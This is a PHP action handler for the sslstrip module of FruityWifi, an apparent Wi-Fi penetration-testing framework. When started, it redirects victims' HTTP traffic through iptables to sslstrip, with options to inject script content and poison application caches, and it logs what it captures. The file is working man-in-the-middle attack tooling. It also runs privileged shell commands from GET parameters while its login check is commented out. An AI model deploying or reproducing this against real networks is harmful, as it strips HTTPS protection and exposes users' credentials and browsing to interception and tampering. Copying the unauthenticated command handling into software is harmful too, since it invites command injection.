<? 
/*
	Copyright (C) 2013  xtr4nge [_AT_] gmail.com

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/ 
?>
<?
//include "../login_check.php";
include "../_info_.php";
include "/usr/share/FruityWifi/www/config/config.php";
include "/usr/share/FruityWifi/www/functions.php";

/*
$mod_path = "/usr/share/FruityWifi/www/modules/sslstrip/";
if (file_exists("$mod_path/_info_.php")) {
	include "$mod_path/_info_.php";
}
*/

// Checking POST & GET variables...
if ($regex == 1) {
    regex_standard($_GET["service"], "../msg.php", $regex_extra);
    regex_standard($_GET["file"], "../msg.php", $regex_extra);
    regex_standard($_GET["action"], "../msg.php", $regex_extra);
    regex_standard($_GET["install"], "../msg.php", $regex_extra);
}

$service = $_GET['service'];
$action = $_GET['action'];
$page = $_GET['page'];
$install = $_GET['install'];

if($service == "sslstrip") {
    if ($action == "start") {
        // COPY LOG
        $exec = "$bin_cp $mod_logs ../modules/sslstrip/includes/logs/sslstrip-".gmdate("Ymd-H-i-s").".log";
        exec("$bin_danger \"$exec\"" );
        
        $exec = "$bin_iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000";
        exec("$bin_danger \"$exec\"" );
        //$exec = "/usr/bin/sslstrip -a -s -l 10000 -w ../logs/sslstrip.log > /dev/null 2 &";
        
        if ($mod_sslstrip_inject == "1" and $mod_sslstrip_tamperer == "0") {
        	$exec = "$bin_sslstrip -a -s -l 10000 -w $mod_logs -i $mod_path/includes/inject.txt > /dev/null 2 &";
        } else if ($mod_sslstrip_inject == "0" and $mod_sslstrip_tamperer == "1") {
        	$exec = "$bin_sslstrip -a -s -l 10000 -w $mod_logs -t $mod_path/includes/app_cache_poison/config.ini > /dev/null 2 &";
        } else if ($mod_sslstrip_inject == "1" and $mod_sslstrip_tamperer == "1") {
        	$exec = "$bin_sslstrip -a -s -l 10000 -w $mod_logs -t $mod_path/includes/app_cache_poison/config.ini -i $mod_path/includes/inject.txt > /dev/null 2 &";
        } else {
        	$exec = "$bin_sslstrip -a -s -l 10000 -w $mod_logs > /dev/null 2 &";
        }
        //$exec = "/usr/bin/sslstrip-tamper -a -s -l 10000 -w ../logs/sslstrip.log -t /usr/share/FruityWifi/www/modules/sslstrip/includes/app_cache_poison/config.ini > /dev/null 2 &";
        
        //$exec = "/usr/bin/sslstrip -a -s -l 10000 -w ../logs/sslstrip/sslstrip-".gmdate("Ymd-H-i-s").".log > /dev/null 2 &";
        exec("$bin_danger \"$exec\"" );
    } else if($action == "stop") {
    	$exec = "$bin_iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000";
        exec("$bin_danger \"$exec\"" );
        $exec = "$bin_killall sslstrip";
        //$exec = "$bin_killall FruityWifi-sslstrip";
        //$exec = "/usr/bin/killall sslstrip-tamper";
        exec("$bin_danger \"$exec\"" );
    }
}


if ($install == "install_sslstrip") {

    $exec = "chmod 755 install.sh";
    exec("$bin_danger \"$exec\"" );

    $exec = "$bin_sudo ./install.sh > /usr/share/FruityWifi/logs/install.txt &";
    exec("$bin_danger \"$exec\"" );

    header('Location: ../../install.php?module=sslstrip');
    exit;
}

//header('Location: ../index.php?tab=0');
header('Location: ../../action.php?page=sslstrip');

/*
if ($page == "list") {
    header('Location: ../page_sslstrip.php');
} else if ($page == "module") {
    //header('Location: ../modules/dnsspoof/index.php');
    header('Location: ../modules/action.php?page=sslstrip');
} else {
    header('Location: ../page_status.php');
}
*/

?>
